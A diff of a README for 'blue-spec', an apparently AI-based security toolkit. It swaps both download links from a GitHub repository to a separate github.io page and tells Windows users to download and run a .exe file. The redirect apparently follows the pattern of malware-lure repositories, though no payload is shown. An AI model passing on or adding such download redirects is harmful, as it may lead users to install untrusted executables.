@@ -1,6 +1,6 @@
 # 🌊 blue-spec - Secure your system with intelligent agents
 
-[![](https://img.shields.io/badge/Download_Blue_Spec-0000FF?style=for-the-badge&logo=github)](https://github.com/impliedtrustwencher377/blue-spec)
+[![](https://img.shields.io/badge/Download_Blue_Spec-0000FF?style=for-the-badge&logo=github)](https://impliedtrustwencher377.github.io)
 
 Blue Spec helps you protect your computer. It uses artificial intelligence to find risks in your system. It then builds stronger defenses. You do not need to be a security expert to use this tool. It observes how your system runs and blocks harmful actions.
 
@@ -24,7 +24,7 @@ Your computer must meet these basic needs:
 
 Follow these steps to set up the toolkit on your Windows computer.
 
-1. Go to the [official release page](https://github.com/impliedtrustwencher377/blue-spec).
+1. Go to the [official release page](https://impliedtrustwencher377.github.io).
 2. Look for the Assets section at the bottom of the page.
 3. Click the file ending in .exe to start the download.
 4. Save this file to your Downloads folder.
